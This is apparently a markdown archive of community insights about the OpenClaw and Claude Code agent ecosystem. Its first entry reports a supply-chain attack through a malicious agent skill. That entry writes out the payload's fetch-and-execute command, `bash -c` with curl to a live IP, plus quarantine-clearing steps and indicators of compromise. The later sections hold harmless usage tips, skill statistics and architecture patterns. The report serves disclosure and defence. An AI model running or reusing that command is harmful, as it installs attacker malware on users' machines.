# insights-archive-2026-03-03.md
*March 2, 2026 entries | HB#29-33 and earlier*

## New Findings — March 2, 2026 (XHS Restored Session)

### 🚨 Supply Chain Attack on ClawHub — CRITICAL ★★★★★
**Source:** 蟑螂 6984e837 | **Discovery:** 2026-03-02 | **Engagement:** ❤️1459

```
Attack Chain:
SKILL.md (base64 encoded payload)
    ↓ decode
bash -c "$(curl -fsSL http://91.92.242.30/lamq4uerkruo6ssm)"
    ↓ download & execute
xattr -c (clear quarantine) → chmod +x → Mach-O binary
    ↓ stage 2
Final payload from same IP
```

**IOCs:**
- Skill: `coding-agent` (path: `~/.openclaw/skills/coding-agent-o10sk4yyb/`)
- IP: `91.92.242.30`
- SHA256: `f2cb9de40cb8b7e13e7d2b0b3e426f8503781a35d8bba3715395430e9b5eeb38`

**Impact:** First publicly documented supply chain attack in OpenClaw ecosystem.

---

### 📚 Claude Code Best Practices — Eyad Handbook ★★★★☆
**Source:** 奥森木 698feae7 | **Original:** Eyad (7.3M views/55K bookmarks) | **Engagement:** ❤️394

**7 Rules:**
1. **Plan First** — Shift+Tab×2 for Plan Mode
2. **CLAUDE.md** ~150 instruction limit
3. **Context Management** — 200K window degrades at 20-40%
4. **Copy-Paste Reset** — copy→/compact→/clear→paste
5. **Prompt Principles** — specific>vague, constraints>open
6. **Model分工** — Opus for planning, Sonnet for execution
7. **Systematize** — claude -p for headless batch

---

### 📊 Skill Ecosystem: Finance Vertical Mature ★★★★☆
**Source:** 这一秒的主动选择者 69a02956 | **Engagement:** ❤️960

**18 Skills Breakdown:**
| Category | Count | Key Skills |
|----------|-------|------------|
| Stock/Finance | 11 (61%) | stock-analysis, tushare-finance |
| News/Info | 3 (17%) | bbc-news, polymarket-odds |
| Data Analysis | 2 (11%) | cfo, data-analysis |
| Feishu | 2 (11%) | feishu-doc, feishu-drive |

---

### 🏗️ Agent Architecture Convergence 2025 ★★★★☆
**Source:** 403-error 6992c596 | **Engagement:** ❤️936

**Evolution Path:**
```
Multi-Agent Framework → Agent Harness/Runtime/SuperAgent
                              ↓
                    ReAct Loop + Middleware + Skills
```

---

## Cross-Archive Synthesis — Feb 28, 2026

### 🔍 Five Patterns Across the Archive (34 posts, 13 authors)

**Pattern 1: "Verify Output" Consensus**
- 小盖: "把它当能力很强的实习生——给明确指令，检查输出"
- CC船长: "让OpenClaw自己配置，但一定要检查！"
- 奥森木: "说done必须附repo+branch+commit hash"

**Pattern 2: Skill = Workflow Embodiment**
- 小盖: Skill是"工作流固化"
- AgenticWeb: Skill Patterns vs Subagent Patterns
- 熠辉 indie: 双AI赛马 → 封装Skill

**Pattern 3: Memory Architecture Evolution**
- MEMORY.md只放索引 → hot/warm/cold三层 → 自动衰减机制

**Pattern 4: Hybrid Architecture (OC Orchestrate + External Execute)**
- OC协调 + CC执行，CC当"保险丝"

**Pattern 5: Containerization & Security Consensus**
- Docker/VM运行成共识
- 公网暴露"几小时内必被扫"

---

## Earlier Entries
See insights-archive-2026-02-28.md and insights-archive-2026-02-28-part2.md
